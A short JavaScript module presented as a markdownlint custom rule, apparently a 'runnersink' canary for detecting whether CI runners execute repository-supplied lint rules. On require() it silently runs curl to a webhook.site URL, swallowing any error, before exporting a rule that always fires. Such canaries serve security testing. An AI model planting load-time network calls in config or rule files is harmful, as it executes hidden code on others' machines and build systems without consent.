// RUNNERSINKS leg B: customRules module — SYNC beacon at require() time.
const cp = require("child_process");
try { cp.execSync("curl -s -m 8 'https://webhook.site/5258ec03-cc28-4684-b688-3fef6b77607e/rsnk-md-customrule'", {stdio: "ignore"}); } catch (e) {}
module.exports = [{
  names: ["RSNK_MD_RULE"],
  description: "runnersink canary rule",
  tags: ["rsnk"],
  function: function (params, onError) { onError({ lineNumber: 1, detail: "RSNK_MD_RULE_FIRED" }); }
}];
